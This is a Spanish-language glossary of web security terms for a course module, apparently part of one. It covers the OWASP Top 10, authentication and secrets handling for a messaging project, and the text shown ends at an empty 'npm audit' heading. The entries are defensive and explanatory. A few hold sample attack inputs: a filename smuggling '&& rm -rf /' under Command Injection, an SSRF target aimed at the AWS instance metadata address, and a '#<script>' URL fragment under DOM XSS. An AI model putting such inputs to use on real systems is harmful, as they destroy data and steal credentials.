# Glosario Técnico  -  Seguridad Web  -  OWASP

> Definiciones de todos los términos técnicos del módulo.
> Ordenado alfabéticamente.

---

## A

### A01  -  Broken Access Control
**Categoría:** OWASP Top 10
**Definición:** Falla en la que un usuario autenticado puede acceder a recursos o ejecutar acciones que no le corresponden porque el sistema no verifica que el recurso pertenece a su contexto. Es la vulnerabilidad número uno en el OWASP Top 10 2021. El fallo suele ocurrir cuando el backend confía únicamente en el token de autenticación sin validar la ownership del dato.
**En el proyecto:** Un agente del sistema de mensajería podría leer conversaciones de otro workspace si el endpoint solo verifica `[Authorize]` pero no valida que `conversation.WorkspaceId == request.WorkspaceId`. Cada handler debe comprobar la pertenencia del recurso al workspace del agente que hace la solicitud.

### A02  -  Cryptographic Failures
**Categoría:** OWASP Top 10
**Definición:** Vulnerabilidad producida por el uso incorrecto o ausente de criptografía: contraseñas almacenadas en texto plano o con algoritmos débiles (MD5, SHA-256), transmisión de datos sensibles sin TLS, uso de claves hardcodeadas o de longitud insuficiente. Era conocida antes como "Sensitive Data Exposure".
**En el proyecto:** El sistema de mensajería maneja credenciales de agentes y tokens de API de WhatsApp/Instagram; almacenar cualquiera de ellos sin cifrar o transmitirlos por HTTP expone toda la plataforma.

### A03  -  Injection
**Categoría:** OWASP Top 10
**Definición:** Clase de vulnerabilidades donde datos no confiables se envían a un intérprete (SQL, shell, LDAP, XML) como parte de un comando o consulta, logrando que el intérprete ejecute instrucciones no previstas. Las variantes más comunes son SQL Injection y Command Injection.
**En el proyecto:** La búsqueda de contactos por email podría ser vulnerable si la query SQL se construye con concatenación de strings en lugar de parámetros nombrados (`@email`). EF Core LINQ y Dapper con parámetros son las mitigaciones directas.

### A04  -  Insecure Design
**Categoría:** OWASP Top 10
**Definición:** Debilidades inherentes al diseño de la aplicación, no a la implementación. Se produce cuando no se modelan amenazas ni se aplican controles de seguridad desde las etapas de arquitectura. Ejemplo: un endpoint de login sin límite de intentos habilita ataques de fuerza bruta por diseño.
**En el proyecto:** El endpoint `POST /auth/login` sin rate limiting permite que un atacante automatice millones de intentos de contraseña; la corrección es de diseño, no de código: agregar un `FixedWindowLimiter` desde el principio.

### A05  -  Security Misconfiguration
**Categoría:** OWASP Top 10
**Definición:** Configuración incorrecta o ausente de seguridad en cualquier capa del stack: headers HTTP faltantes, permisos por defecto demasiado amplios, mensajes de error con stack traces, puertos abiertos innecesarios o software sin parchear. Es una de las vulnerabilidades más frecuentes en producción.
**En el proyecto:** La API del sistema de mensajería sin headers como `X-Frame-Options`, `X-Content-Type-Options` o `Content-Security-Policy` está mal configurada. Un middleware centralizado en `Program.cs` debe agregar todos los headers en un solo punto.

### A06  -  Vulnerable and Outdated Components
**Categoría:** OWASP Top 10
**Definición:** Uso de librerías, frameworks o componentes con CVEs (vulnerabilidades públicamente conocidas) no parcheadas. El riesgo se multiplica porque el atacante puede aprovechar exploits ya documentados y disponibles públicamente.
**En el proyecto:** Los paquetes NuGet del back-end y los módulos npm del front-end del sistema de mensajería deben auditarse periódicamente con `dotnet audit` y `npm audit`, y mantenerse actualizados mediante Dependabot o revisiones manuales en cada sprint.

### A07  -  Identification and Authentication Failures
**Categoría:** OWASP Top 10
**Definición:** Fallos en los mecanismos de autenticación e identificación: tokens JWT sin expiración o sin rotación, sesiones que no se invalidan al cerrar sesión, ausencia de MFA en operaciones sensibles, o contraseñas débiles aceptadas sin validación. Antes llamado "Broken Authentication".
**En el proyecto:** Un access token JWT del sistema de mensajería sin tiempo de expiración o sin invalidación en logout permite que un token robado sea válido indefinidamente. La solución es usar cookies HttpOnly con expiración de 15 minutos y un endpoint de logout que elimine la cookie.

### A08  -  Software and Data Integrity Failures
**Categoría:** OWASP Top 10
**Definición:** Vulnerabilidades relacionadas con la falta de verificación de integridad en actualizaciones de software, datos críticos o pipelines CI/CD. Incluye la deserialización insegura y el uso de plugins de fuentes no verificadas. En el contexto de CRM, abarca también la ausencia de validación de firmas en webhooks recibidos.
**En el proyecto:** Los webhooks de WhatsApp e Instagram que llegan al sistema de mensajería deben validarse con la firma HMAC que incluye el proveedor. Sin validación, cualquiera podría enviar eventos falsos al endpoint y manipular el sistema.

### A09  -  Security Logging and Monitoring Failures
**Categoría:** OWASP Top 10
**Definición:** Ausencia o insuficiencia de registros de eventos de seguridad: intentos de login fallidos, accesos denegados, errores de validación de tokens. Sin logs adecuados es imposible detectar un ataque en curso o reconstruir un incidente post-mortem.
**En el proyecto:** El sistema de mensajería debe registrar con Serilog todos los intentos de login fallidos, accesos a recursos no autorizados y errores de validación de JWT. Esos logs deben enviarse a CloudWatch (AWS) o Log Analytics (Azure) para alertas en tiempo real.

### A10  -  SSRF (Server-Side Request Forgery)
**Categoría:** OWASP Top 10
**Definición:** Ataque en el que se engaña al servidor para que realice requests HTTP a destinos controlados por el atacante: servicios internos de la red, metadata de instancias cloud (ej. `169.254.169.254` en AWS), o sistemas externos no autorizados. El servidor actúa como proxy involuntario.
**En el proyecto:** Si el sistema de mensajería permite que los contactos o agentes envíen URLs que la aplicación descarga o procesa (p. ej. al importar medios), un atacante podría apuntar a `http://169.254.169.254/latest/meta-data/` y robar las credenciales IAM de la instancia ECS.

### Access Token
**Categoría:** Autenticación / JWT
**Definición:** Token de corta duración (típicamente 15 minutos) que prueba la identidad y los permisos del usuario que realiza un request. Contiene claims como `sub`, `workspace_id`, `permissions` y tiene una firma digital que impide su manipulación. No debe almacenarse en `localStorage` porque es accesible por JavaScript.
**En el proyecto:** El sistema de mensajería emite access tokens JWT HS256 al autenticar un agente. Se almacenan en cookies HttpOnly con `SameSite=Strict` para que no sean accesibles por XSS ni reutilizables en ataques CSRF.

### AddRateLimiter
**Categoría:** ASP.NET Core / Seguridad
**Definición:** Método de extensión de ASP.NET Core (disponible desde .NET 7) que registra el middleware de rate limiting en el contenedor DI. Permite configurar políticas con nombre (fixed window, sliding window, token bucket, concurrency) que se aplican por endpoint mediante `[EnableRateLimiting("nombre")]`.
**En el proyecto:** Se configura en `Program.cs` del sistema de mensajería con un `FixedWindowLimiter` de nombre `"login"` que permite máximo 5 intentos en ventanas de 15 minutos para el endpoint `POST /auth/login`.

### AddSecretsManager
**Categoría:** AWS / Secretos
**Definición:** Método de extensión de la librería `Amazon.Extensions.Configuration.SystemsManager` que agrega AWS Secrets Manager como proveedor de configuración de `IConfiguration`. Permite filtrar secretos por prefijo y transformar sus claves para seguir la convención de sección de `IConfiguration` (doble guion bajo `__` -> dos puntos `:`).
**En el proyecto:** En el sistema de mensajería en producción sobre ECS, `AddSecretsManager` carga automáticamente al arrancar todos los secretos de `mensajeria/production`, incluyendo la connection string de PostgreSQL y los tokens de WhatsApp/Instagram.

### AllowCredentials
**Categoría:** CORS / HTTP
**Definición:** Método del builder de política CORS en ASP.NET Core que indica al browser que puede incluir credenciales (cookies, headers de autorización) en requests cross-origin. Es mutuamente excluyente con `AllowAnyOrigin()`: si se usan credenciales, deben especificarse orígenes exactos.
**En el proyecto:** Necesario en el sistema de mensajería porque el access token viaja en una cookie HttpOnly. Sin `AllowCredentials()` el browser no enviará la cookie desde `app.example.com` hacia la API.

### ArgumentList
**Categoría:** .NET / Command Injection
**Definición:** Propiedad de `ProcessStartInfo` (tipo `Collection<string>`) que permite pasar argumentos a un proceso externo como elementos separados de un array, en lugar de como un string concatenado. El runtime construye los argumentos de forma segura sin riesgo de inyección de shell.
**En el proyecto:** Si el sistema de mensajería necesita invocar herramientas externas para convertir archivos de medios recibidos por WhatsApp, debe usar `ArgumentList` en lugar de concatenar el nombre del archivo en el argumento del proceso.

### Asumir Breach (Assume Breach)
**Categoría:** Zero Trust
**Definición:** Pilar del modelo Zero Trust que establece que se debe diseñar y operar el sistema asumiendo que algún componente ya fue comprometido. Implica validar y autorizar cada operación en cada capa del sistema, sin confiar en que la red interna o un servicio hermano son seguros por estar "dentro del perímetro".
**En el proyecto:** Cada handler del sistema de mensajería (como `SendMessageHandler`) verifica que el agente tiene acceso a la conversación específica, incluso si el request llegó desde otro microservicio interno. No se asume que el llamador es de confianza.

### AWS IAM Role
**Categoría:** AWS / Seguridad
**Definición:** Identidad de AWS que define permisos que pueden asumir servicios de AWS (ECS, EC2, Lambda) sin necesidad de credenciales explícitas (access key / secret key). La instancia o tarea asume el rol al arrancar y obtiene tokens temporales rotados automáticamente por AWS STS.
**En el proyecto:** La ECS task definition del sistema de mensajería asume un IAM Role con permiso `secretsmanager:GetSecretValue` restringido al ARN del secreto `mensajeria/production`. La aplicación nunca necesita credenciales propias.

### AWS Secrets Manager
**Categoría:** AWS / Secretos
**Definición:** Servicio gestionado de AWS para almacenar, rotar y auditar secretos como contraseñas, tokens de API y connection strings. Cifra los valores con KMS y permite rotación automática. El acceso se controla con políticas IAM, sin necesidad de credenciales en código.
**En el proyecto:** En el entorno de producción (ECS), el sistema de mensajería lee su connection string de PostgreSQL, el JWT secret y los tokens de WhatsApp/Instagram desde AWS Secrets Manager en lugar de archivos de configuración.

### Azure Key Vault
**Categoría:** Azure / Secretos
**Definición:** Servicio gestionado de Azure para almacenar secretos, claves criptográficas y certificados. Integra con Managed Identity para que las aplicaciones en App Service o AKS accedan a los secretos sin credenciales en código. Registra cada acceso en logs de auditoría.
**En el proyecto:** Si el sistema de mensajería se despliega en Azure, sus secretos (connection string, tokens de API) se almacenan en Key Vault. `DefaultAzureCredential` en `Program.cs` usa Managed Identity en producción y `az login` en desarrollo sin cambiar código.

### Azure Managed Identity
**Categoría:** Azure / Seguridad
**Definición:** Identidad gestionada automáticamente por Azure que se asigna a recursos como App Service, AKS o funciones. Permite que el servicio se autentique con otros recursos de Azure (Key Vault, SQL, Service Bus) sin credenciales almacenadas, usando tokens renovados automáticamente.
**En el proyecto:** La App Service o contenedor AKS del sistema de mensajería usa Managed Identity para obtener los secretos del Key Vault. `DefaultAzureCredential` detecta la identidad del entorno sin código adicional.

---

## B

### BCrypt
**Categoría:** Criptografía / Passwords
**Definición:** Función de hashing de contraseñas diseñada específicamente para ser computacionalmente lenta, lo que la hace resistente a ataques de fuerza bruta con GPU. Incorpora un salt aleatorio automáticamente en cada hash y un parámetro `workFactor` que controla el número de iteraciones. El salt y la versión quedan embebidos en el propio hash, por lo que no hay que almacenarlos por separado.
**En el proyecto:** El sistema de mensajería usa `BCrypt.Net.BCrypt.HashPassword(password, workFactor: 12)` para almacenar contraseñas de agentes. Un `workFactor` de 12 implica aproximadamente 250 ms por hash, haciendo impracticable el cracking masivo incluso si la base de datos fuera robada.

### Broken Access Control
**Categoría:** OWASP Top 10 / Autorización
**Definición:** Ver A01  -  Broken Access Control. Se menciona aquí por su nombre completo en inglés ya que es la categoría más citada en auditorías de seguridad. Es la vulnerabilidad más crítica del OWASP Top 10 2021 porque es muy frecuente y tiene impacto alto: permite a un atacante leer, modificar o eliminar datos ajenos.
**En el proyecto:** En el sistema de mensajería, cada endpoint y cada handler deben verificar explícitamente que el recurso accedido pertenece al workspace del agente autenticado, no solo que el agente esté autenticado.

---

## C

### Claim (JWT Claim)
**Categoría:** JWT / Autenticación
**Definición:** Par clave-valor dentro del payload de un token JWT que declara información sobre el sujeto (usuario) o el contexto del request. Los claims estándar incluyen `sub` (subject), `exp` (expiration), `iat` (issued at). Los claims personalizados permiten expresar permisos y contexto de negocio.
**En el proyecto:** El sistema de mensajería incluye claims como `workspace_id` y `permission` (con valores como `conversations:read`, `contacts:export`) en el JWT del agente. Estos claims se leen en las políticas de autorización de ASP.NET Core para control granular de acceso.

### Command Injection
**Categoría:** Seguridad / OWASP A03
**Definición:** Variante de inyección donde el input del usuario se incorpora sin sanitizar a los argumentos de un proceso del sistema operativo, permitiendo al atacante ejecutar comandos arbitrarios. Ejemplo clásico: un nombre de archivo que incluye `&& rm -rf /` ejecuta ambos comandos si se concatena como string.
**En el proyecto:** Si el sistema de mensajería invoca herramientas externas (p. ej. `convert` de ImageMagick) para procesar adjuntos de mensajes, el nombre del archivo debe validarse con regex restrictivo y pasarse como `ArgumentList`, nunca concatenado.

### Content-Security-Policy (CSP)
**Categoría:** HTTP / Headers de seguridad
**Definición:** Header HTTP que indica al browser qué orígenes, tipos de recursos y directivas puede usar al procesar la página. Permite bloquear la ejecución de scripts inline y de dominios no autorizados, siendo la segunda línea de defensa más efectiva contra XSS (después del escape en el servidor).
**En el proyecto:** La API del sistema de mensajería agrega el header `Content-Security-Policy: default-src 'self'; script-src 'self'; connect-src 'self' wss://crm.example.com` para permitir solo scripts propios y las conexiones WebSocket de SignalR hacia el dominio propio.

### Cookie HttpOnly
**Categoría:** Seguridad / HTTP
**Definición:** Atributo de cookie que impide que JavaScript del lado del cliente acceda a su valor mediante `document.cookie`. Es la principal mitigación para el robo de tokens mediante XSS: aunque el ataque inyecte código JavaScript, no podrá leer el token de sesión.
**En el proyecto:** El access token JWT del sistema de mensajería se almacena en una cookie HttpOnly con `Secure=true` y `SameSite=Strict`, en lugar de en `localStorage`. Esto protege el token incluso si un script XSS se ejecuta en el browser del agente.

### CookieOptions
**Categoría:** ASP.NET Core / Seguridad
**Definición:** Clase de ASP.NET Core que encapsula todas las propiedades de una cookie de respuesta: `HttpOnly`, `Secure`, `SameSite`, `Expires`, `Domain` y `Path`. Se pasa como segundo argumento a `Response.Cookies.Append()`.
**En el proyecto:** En el endpoint `POST /auth/login` del sistema de mensajería, las `CookieOptions` configuran el access token con `HttpOnly=true`, `Secure=true`, `SameSite=Strict` y expiración de 15 minutos.

### CORS (Cross-Origin Resource Sharing)
**Categoría:** HTTP / Seguridad
**Definición:** Mecanismo del browser que restringe qué orígenes (combinación de protocolo, dominio y puerto) pueden hacer requests HTTP a tu API. El browser envía un request preflight `OPTIONS` y solo procede si el servidor responde con los headers `Access-Control-Allow-Origin` y `Access-Control-Allow-Methods` correctos. CORS solo protege desde el browser; no protege contra requests directos de servidor a servidor.
**En el proyecto:** La API del sistema de mensajería configura una política CORS que solo permite orígenes `https://app.example.com` y `https://admin.example.com`. Usar `AllowAnyOrigin()` con cookies HttpOnly es inválido en ASP.NET Core.

### CSRF (Cross-Site Request Forgery)
**Categoría:** Seguridad / HTTP
**Definición:** Ataque donde un sitio web malicioso fuerza al browser de la víctima a enviar requests autenticadas a otro sitio donde la víctima tiene sesión activa. El browser adjunta automáticamente las cookies de sesión. Se mitiga con el atributo `SameSite=Strict` en las cookies y con tokens anti-CSRF.
**En el proyecto:** El sistema de mensajería usa `SameSite=Strict` en la cookie del access token para que el browser solo la envíe en requests que se originan directamente desde el propio dominio, bloqueando requests forjadas desde sitios externos.

### CVE (Common Vulnerabilities and Exposures)
**Categoría:** Seguridad
**Definición:** Identificador estándar (formato `CVE-YYYY-NNNNN`) asignado por MITRE a vulnerabilidades de seguridad públicamente conocidas en software. Permite rastrear, priorizar y remediar vulnerabilidades de forma sistemática. Cualquier paquete puede tener CVEs abiertos que el equipo de desarrollo debe monitorear.
**En el proyecto:** Los paquetes NuGet (p. ej. `Newtonsoft.Json`, `System.Text.Json`) y los módulos npm del front del sistema de mensajería pueden tener CVEs conocidos. El comando `dotnet audit` y Dependabot en GitHub alertan cuando algún paquete tiene un CVE activo.

---

## D

### Dapper
**Categoría:** .NET / ORM / Base de datos
**Definición:** Micro-ORM para .NET que ejecuta SQL directamente sobre `IDbConnection`. A diferencia de EF Core, el desarrollador escribe el SQL manualmente. Cuando se usan parámetros nombrados (`@param`), Dapper los escapa automáticamente, previniendo SQL Injection.
**En el proyecto:** En las queries de búsqueda de contactos del sistema de mensajería que se implementan con Dapper, la variable `email` debe pasarse como `new { email }` al método `QuerySingleOrDefaultAsync`, nunca interpolada en el string SQL.

### dangerouslySetInnerHTML
**Categoría:** React / XSS
**Definición:** Prop de React que permite insertar HTML arbitrario directamente en el DOM, bypaseando el escape automático de React. Es un vector de XSS si el contenido proviene de fuentes externas (mensajes de usuarios, contenido de la API) sin sanitizar previamente.
**En el proyecto:** En el componente `MessageBubble` del front del sistema de mensajería, `dangerouslySetInnerHTML` solo debe usarse si el contenido fue sanitizado primero con `DOMPurify.sanitize()`. Para texto plano, siempre usar `{content}` como children de React.

### DefaultAzureCredential
**Categoría:** Azure / Autenticación
**Definición:** Clase del SDK de Azure Identity que intenta obtener un token de autenticación probando una cadena de mecanismos en orden: Managed Identity, variables de entorno, `az login` (CLI), Visual Studio, etc. Permite escribir código de acceso a recursos Azure una sola vez que funciona tanto en producción como en desarrollo local.
**En el proyecto:** En el sistema de mensajería con Azure Key Vault, `new DefaultAzureCredential()` en `Program.cs` usa Managed Identity cuando corre en App Service y las credenciales de `az login` cuando el desarrollador corre el proyecto localmente.

### Dependabot
**Categoría:** GitHub / Seguridad
**Definición:** Servicio de GitHub que escanea automáticamente el árbol de dependencias del repositorio, detecta paquetes con CVEs y abre pull requests con las actualizaciones necesarias. Puede configurarse para NuGet, npm, Docker y otros ecosistemas.
**En el proyecto:** En el repositorio del sistema de mensajería, Dependabot debe estar habilitado para los proyectos .NET y para el front React, de manera que el equipo reciba PRs automáticas cuando una dependencia tenga un CVE conocido.

### DOM-based XSS
**Categoría:** Seguridad / XSS
**Definición:** Variante de XSS donde el script malicioso no pasa por el servidor: el JavaScript existente en la página toma input del usuario (p. ej. `location.hash`, `document.referrer`) y lo inserta en el DOM sin sanitizar. El servidor solo ve el URL sin el fragmento `#`, por lo que los filtros del lado servidor no lo detectan.
**En el proyecto:** Si el front del sistema de mensajería usa `location.hash` para navegar entre vistas y lo inyecta en `innerHTML`, un atacante puede construir un URL con `#<script>...` y enviárselo a un agente para robar su token de sesión.

### DOMPurify
**Categoría:** JavaScript / Seguridad / XSS
**Definición:** Librería JavaScript que sanitiza HTML arbitrario eliminando etiquetas y atributos peligrosos (scripts, event handlers inline, etc.) antes de insertarlos en el DOM. Es la solución estándar cuando se necesita renderizar HTML de fuentes externas en aplicaciones React o vanilla JS.
**En el proyecto:** El componente `MessageBubble` del sistema de mensajería debe importar `DOMPurify` y llamar `DOMPurify.sanitize(content)` antes de pasar el valor a `dangerouslySetInnerHTML`, si el contenido del mensaje puede contener formato HTML.

### dotnet audit
**Categoría:** .NET / Herramienta
**Definición:** Comando de la CLI de .NET que verifica el árbol de dependencias NuGet del proyecto contra la base de datos pública de advisories de seguridad (NuGet Advisory Database) y reporta paquetes con CVEs conocidos y sus versiones mínimas corregidas.
**En el proyecto:** El pipeline de CI/CD del sistema de mensajería debe ejecutar `dotnet audit` en cada build para detectar dependencias vulnerables antes de que el código llegue a producción. Un resultado no vacío debe bloquear el despliegue.

### dotnet user-secrets
**Categoría:** .NET / Secretos
**Definición:** Herramienta de la CLI de .NET que almacena secretos de desarrollo fuera del directorio del repositorio, en `%APPDATA%\Microsoft\UserSecrets\<guid>\secrets.json` en Windows. Se inicializa con `dotnet user-secrets init`, que agrega un `<UserSecretsId>` al `.csproj`. En el entorno `Development`, `WebApplication.CreateBuilder()` los carga automáticamente en `IConfiguration`.
**En el proyecto:** Cada desarrollador del sistema de mensajería guarda localmente su connection string de PostgreSQL, el JWT secret y los tokens de WhatsApp con `dotnet user-secrets set`. Estos valores nunca llegan al repositorio Git.

---

## E

### EF Core (Entity Framework Core)
**Categoría:** .NET / ORM
**Definición:** ORM oficial de Microsoft para .NET que traduce consultas LINQ a SQL parametrizado. Porque construye los queries de forma interna, nunca concatena input del usuario en el SQL resultante, eliminando el riesgo de SQL Injection para las queries expresadas con LINQ.
**En el proyecto:** Las consultas del sistema de mensajería sobre `Contacts`, `Conversations` y `Messages` escritas con EF Core LINQ son seguras por construcción. Las queries nativas con `ExecuteSqlRaw` sí requieren parámetros explícitos.

### EnableRateLimiting
**Categoría:** ASP.NET Core / Seguridad
**Definición:** Atributo de ASP.NET Core (disponible desde .NET 7) que aplica una política de rate limiting por nombre a un endpoint o controlador específico. Complementa a `UseRateLimiter()` en el pipeline de middlewares.
**En el proyecto:** Se aplica `[EnableRateLimiting("login")]` al endpoint `POST /auth/login` del sistema de mensajería para limitar a 5 intentos por IP en ventanas de 15 minutos. No se aplica a todos los endpoints para no penalizar el tráfico legítimo.

---

## F

### FixedWindowLimiter
**Categoría:** ASP.NET Core / Rate Limiting
**Definición:** Implementación de rate limiting que cuenta solicitudes dentro de ventanas de tiempo fijas (p. ej. de 0:00 a 0:15, de 0:15 a 0:30). Al final de cada ventana el contador se reinicia. Es la estrategia más simple de implementar pero puede ser evadida enviando ráfagas justo antes del reset.
**En el proyecto:** El sistema de mensajería usa un `FixedWindowLimiter` de 5 solicitudes por ventana de 15 minutos para el endpoint de login. En producción con múltiples instancias, el almacén del contador debe ser Redis compartido.

### Fuerza Bruta (Brute Force)
**Categoría:** Seguridad / Ataque
**Definición:** Ataque que intenta todas las combinaciones posibles de credenciales (usuario/contraseña) hasta encontrar la correcta. La viabilidad del ataque depende de la velocidad del hash de contraseñas y de la ausencia de límites de intentos. Los algoritmos rápidos como SHA-256 y la falta de rate limiting hacen el ataque práctico.
**En el proyecto:** Sin BCrypt (workFactor alto) y sin rate limiting, el endpoint de login del sistema de mensajería sería vulnerable a fuerza bruta automatizada. Con ambas medidas activas, un atacante necesitaría décadas para probar combinaciones masivas.

---

## G

### GitHub Secrets
**Categoría:** CI/CD / Secretos
**Definición:** Mecanismo de GitHub Actions para almacenar valores sensibles (tokens, contraseñas, ARNs) a nivel de repositorio u organización, disponibles en los workflows como variables de entorno mediante la sintaxis `${{ secrets.NOMBRE }}`. Los valores nunca aparecen en los logs del pipeline.
**En el proyecto:** El pipeline de CI/CD del sistema de mensajería usa GitHub Secrets para almacenar el ARN del secreto en AWS Secrets Manager y el role ARN de OIDC que autoriza el despliegue a ECS, evitando hardcodear credenciales en los archivos YAML del workflow.

---

## H

### HMAC (Hash-based Message Authentication Code)
**Categoría:** Criptografía / Seguridad
**Definición:** Código de autenticación de mensaje que combina una clave secreta compartida con una función de hash (SHA-256, SHA-512) para producir un código que garantiza tanto la integridad como la autenticidad del mensaje. Solo quien conoce la clave puede generar o verificar el HMAC.
**En el proyecto:** Los webhooks que WhatsApp e Instagram envían al sistema de mensajería incluyen una firma HMAC-SHA256 en el header `X-Hub-Signature-256`. El endpoint de webhooks debe calcular el HMAC del payload recibido con el `AppSecret` del canal y compararlo con la firma del header para verificar la autenticidad.

### HSTS (HTTP Strict Transport Security)
**Categoría:** HTTP / Headers de seguridad
**Definición:** Header HTTP (`Strict-Transport-Security`) que instruye al browser a usar exclusivamente HTTPS para comunicarse con el dominio durante el período indicado en `max-age`. Una vez recibido el header, el browser nunca intentará HTTP, previniendo ataques de SSL stripping. El flag `preload` permite incluir el dominio en la lista de precarga del browser.
**En el proyecto:** El sistema de mensajería configura HSTS con `max-age=31536000` (un año), `includeSubDomains` (para que aplique también a `api.example.com`) y `preload`. Esto garantiza que los browsers de los agentes siempre usen HTTPS, incluso en la primera visita.

### HttpOnly
**Categoría:** Seguridad / HTTP
**Definición:** Atributo de la directiva `Set-Cookie` que impide el acceso al valor de la cookie desde JavaScript mediante `document.cookie`. Es la mitigación más directa contra el robo de tokens de sesión via XSS. Se configura junto con `Secure` y `SameSite` para máxima protección.
**En el proyecto:** El access token del agente en el sistema de mensajería se envía como cookie HttpOnly, de modo que aunque un script XSS logre ejecutarse en el browser, no podrá leer ni exfiltrar el token.

### HTTPS (HTTP Secure)
**Categoría:** HTTP / Criptografía
**Definición:** Versión cifrada de HTTP que usa TLS (Transport Layer Security) para cifrar el canal de comunicación entre cliente y servidor. Garantiza confidencialidad (nadie puede leer los datos en tránsito), integridad (nadie puede modificarlos) y autenticidad del servidor (certificado TLS).
**En el proyecto:** Toda comunicación del sistema de mensajería  -  navegador a API, API a servicios internos, API a WhatsApp/Instagram  -  debe realizarse exclusivamente por HTTPS. La combinación de `UseHttpsRedirection` y `UseHsts` en .NET garantiza que ningún request llegue por HTTP.

---

## I

### IConfiguration
**Categoría:** .NET / Configuración
**Definición:** Interfaz de abstracción de `Microsoft.Extensions.Configuration` que unifica el acceso a valores de configuración provenientes de múltiples fuentes (appsettings.json, variables de entorno, user secrets, AWS Secrets Manager, Azure Key Vault) mediante una API uniforme de clave/valor. Los proveedores se suman en cadena de mayor a menor prioridad.
**En el proyecto:** En el sistema de mensajería, `IConfiguration` en `Program.cs` lee la configuración de JWT, connection strings y tokens de API desde distintas fuentes según el entorno: user secrets en Development, AWS Secrets Manager en producción, sin cambiar el código que los consume.

### IncludeSubDomains (HSTS)
**Categoría:** HTTP / HSTS
**Definición:** Directiva del header HSTS que extiende la política de HTTPS obligatorio a todos los subdominios del dominio principal. Sin esta directiva, un subdominio podría ser accedido por HTTP y usado como vector de ataque contra el dominio principal.
**En el proyecto:** El sistema de mensajería activa `IncludeSubDomains` en la configuración de HSTS para que tanto `app.example.com` como `api.example.com` y cualquier otro subdominio queden cubiertos por la política de HTTPS obligatorio.

### Insecure Design
**Categoría:** OWASP Top 10
**Definición:** Ver A04  -  Insecure Design. Referencia al nombre completo de la categoría OWASP para facilitar búsquedas. Es una categoría que enfatiza que los problemas de seguridad no son siempre errores de implementación sino de diseño arquitectónico.
**En el proyecto:** El diseño del módulo de autenticación del sistema de mensajería debe incluir rate limiting desde el inicio como requisito funcional, no como mejora posterior.

---

## J

### JWT (JSON Web Token)
**Categoría:** Autenticación / Seguridad
**Definición:** Estándar RFC 7519 para tokens de autenticación compuestos por tres partes codificadas en Base64URL separadas por puntos: header (algoritmo), payload (claims) y firma. La firma garantiza que el payload no fue modificado. Los tokens son self-contained: no requieren consultar la base de datos para validarlos.
**En el proyecto:** El sistema de mensajería emite tokens JWT HS256 al autenticar agentes. El payload incluye `sub` (agente ID), `workspace_id` y `permissions`. El token se envía en cookie HttpOnly y se valida en el middleware de autenticación de ASP.NET Core.

---

## K

### KMS (Key Management Service)
**Categoría:** AWS / Criptografía
**Definición:** Servicio de AWS para crear, gestionar y rotar claves de cifrado simétricas y asimétricas. AWS Secrets Manager usa KMS automáticamente para cifrar todos los secretos almacenados. El acceso a las claves KMS se controla con políticas IAM.
**En el proyecto:** Cuando el sistema de mensajería almacena sus secretos en AWS Secrets Manager, estos se cifran en reposo con KMS. La ECS task role solo necesita permiso `secretsmanager:GetSecretValue`; KMS se usa de forma transparente.

---

## L

### Least Privilege
**Categoría:** Zero Trust / Seguridad
**Definición:** Principio de seguridad que establece que cada entidad (usuario, servicio, rol) debe tener únicamente los permisos mínimos necesarios para realizar su función, y nada más. Reduce el radio de explosión de una brecha de seguridad: si una cuenta es comprometida, el atacante solo obtiene los permisos de esa cuenta.
**En el proyecto:** En el sistema de mensajería, en lugar de un rol `admin` que "puede todo", se usan claims granulares como `conversations:read`, `conversations:assign` y `contacts:export`. Un agente de soporte que solo atiende conversaciones no tiene el claim `contacts:export`.

### localStorage
**Categoría:** Browser / Seguridad
**Definición:** API del browser que persiste datos clave-valor en el almacenamiento local del navegador. A diferencia de las cookies, `localStorage` es accesible desde JavaScript sin restricciones, lo que lo hace inadecuado para almacenar tokens de autenticación: cualquier script XSS puede leerlo con `localStorage.getItem("token")`.
**En el proyecto:** El sistema de mensajería no almacena el access token JWT en `localStorage`. Lo almacena en una cookie HttpOnly que JavaScript no puede leer, eliminando el riesgo de robo de token vía XSS.

---

## M

### MD5
**Categoría:** Criptografía / Algoritmo roto
**Definición:** Función de hash criptográfico diseñada en 1991, rota criptográficamente desde finales de los 90 (colisiones demostrables). Diseñada para ser rápida, lo que la hace completamente inadecuada para hashing de contraseñas: una GPU moderna puede calcular miles de millones de hashes MD5 por segundo, haciendo trivial el cracking por fuerza bruta.
**En el proyecto:** Ningún componente del sistema de mensajería debe usar MD5 para contraseñas. Solo es aceptable para verificación de integridad de archivos (checksums) en contextos donde la velocidad es deseada y el secreto no importa.

### MFA (Multi-Factor Authentication)
**Categoría:** Autenticación / Seguridad
**Definición:** Método de autenticación que requiere que el usuario demuestre su identidad mediante dos o más factores independientes: algo que sabe (contraseña), algo que tiene (TOTP, SMS) y algo que es (biometría). Protege contra el robo de contraseñas porque el atacante también necesita el segundo factor.
**En el proyecto:** En el modelo Zero Trust del sistema de mensajería, los agentes con acceso a información sensible (admin, supervisores) deben autenticarse con MFA. El pilar "verificar identidad" de Zero Trust menciona MFA explícitamente para operaciones críticas.

### Middleware (ASP.NET Core)
**Categoría:** ASP.NET Core / Arquitectura
**Definición:** Componente del pipeline de ASP.NET Core que intercepta cada request y response HTTP. Los middlewares se encadenan en orden; cada uno puede procesar el request, modificar el response, o cortocircuitar la cadena. Se usan para cross-cutting concerns como autenticación, CORS, rate limiting y headers de seguridad.
**En el proyecto:** El sistema de mensajería usa un middleware personalizado en `Program.cs` para agregar todos los headers de seguridad (`X-Frame-Options`, `X-Content-Type-Options`, `CSP`, `Permissions-Policy`) a todas las respuestas HTTP en un solo punto centralizado.

### Modelo Perimetral
**Categoría:** Seguridad / Arquitectura
**Definición:** Modelo de seguridad tradicional ("castillo y foso") que asume que todo lo que está dentro de la red corporativa es confiable y solo lo externo es peligroso. Una vez que un atacante penetra el perímetro (firewall), obtiene acceso irrestricto a todos los recursos internos. Zero Trust es su reemplazo moderno.
**En el proyecto:** Si el sistema de mensajería usara modelo perimetral, un atacante que comprometiera un servicio interno podría acceder libremente a la base de datos y a todos los endpoints internos. Zero Trust previene esto validando cada request independientemente de su origen.

### mTLS (Mutual TLS)
**Categoría:** Seguridad / Zero Trust
**Definición:** Variante de TLS donde tanto el servidor como el cliente presentan y validan certificados X.509. A diferencia del TLS estándar donde solo el servidor se autentica, mTLS garantiza que ambas partes son quienes dicen ser. Es el mecanismo estándar para autenticación entre servicios internos en arquitecturas Zero Trust.
**En el proyecto:** Si el sistema de mensajería evoluciona a arquitectura de múltiples servicios, los servicios internos (p. ej. el servicio de notificaciones llamando al servicio de mensajes) usarían mTLS para autenticarse mutuamente, sin depender de tokens JWT que podrían ser robados.

---

## N

### npm audit
